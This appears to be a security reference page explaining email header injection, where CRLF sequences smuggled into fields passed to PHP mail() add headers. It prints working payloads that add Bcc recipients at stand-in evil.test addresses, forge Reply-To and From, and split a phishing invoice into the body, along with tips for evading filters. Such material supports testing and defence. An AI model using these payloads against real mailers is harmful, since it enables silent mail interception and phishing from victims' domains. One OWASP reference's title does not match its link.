---
title: "Header injection: smuggling CRLF into email headers"
description: "Injecting CRLF (%0d%0a) into Subject, From, or To so concatenated input adds extra Bcc/Cc recipients, forges headers, or splits into the message body, the classic PHP mail() additional-headers sink."
keywords:
  - email header injection
  - CRLF injection
  - mail header injection
  - Bcc injection
  - PHP mail
  - additional headers
---

# Header injection

Email headers are a block of `Name: value` lines separated by `CRLF` (`\r\n`, URL-encoded `%0d%0a`) and terminated by one blank line. When an application drops a user-supplied value straight into a header, a `CRLF` in that value ends the current header early and lets the attacker write further header lines, or an extra blank line that pushes everything after it into the body. One unsanitized field becomes control over the whole header block.

## The classic sink

PHP's `mail()` concatenates its fourth argument (additional headers) verbatim:

```php
mail($to, $subject, $body, "From: " . $_POST['sender']);
```

Anything the user puts in `sender` after a `CRLF` becomes new headers. The same flaw exists wherever `Subject`, `From`, `To`, `Reply-To`, or a custom header is built from a request field without stripping line breaks, including mailer libraries called with raw strings.

## Injecting extra recipients

The highest-value move is adding a `Bcc:` so a silent copy of every message goes to the attacker. With the sender field as the entry point, the raw payload is:

```
attacker@evil.test%0d%0aBcc:collector@evil.test
```

which resolves on the wire to:

```
From: attacker@evil.test
Bcc: collector@evil.test
```

A `Cc:` works the same way and is visible to the real recipient, so `Bcc:` is usually preferred. Multiple recipients can be chained in one field:

```
x@evil.test%0d%0aBcc:a@evil.test,b@evil.test,c@evil.test
```

This turns a contact form or password-reset mailer into an attacker-controlled mail-sending channel (not an open relay, which is an MTA that relays for arbitrary third parties; here the app is repurposed as a sender) for spam or phishing from the victim's own domain, inheriting its SPF and DKIM reputation.

## Forging and overriding headers

Because injected lines are just more headers, the attacker can set any of them. Inject a `Reply-To:` so replies land on an attacker inbox, or restate `From:` to impersonate an internal address:

```
support@victim.test%0d%0aReply-To:attacker@evil.test
```

Duplicate headers resolve in client- and MTA-specific ways, which the attacker can exploit to show one value to a filter and another to the reader.

## Splitting into the body

Two consecutive `CRLF`s close the header block. Everything after the blank line is message body, so the attacker can overwrite the application's intended body with their own content, including HTML:

```
x@evil.test%0d%0aBcc:collector@evil.test%0d%0a%0d%0a<h1>Pay this invoice</h1>
```

This is how a benign "contact us" endpoint is repurposed to deliver a fully attacker-written phishing email.

## Encoding on the wire

The injection must arrive as real carriage-return and line-feed bytes at the sink.

- In URL-encoded request bodies and query strings, use `%0d%0a`.
- Some stacks act on a bare `%0a` (LF only) or a bare `%0d`; test each when the full pair is stripped.
- In JSON, send the escape `\r\n`.
- Where the field is pre-decoded, paste literal newlines.

Folding rules also matter: a line beginning with a space or tab is a continuation of the previous header, so leading whitespace after your `CRLF` may merge your line into the one above instead of starting a new header.

## References

- [OWASP: Testing for IMAP SMTP Injection (WSTG)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_HTTP_Splitting_Smuggling)
- [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
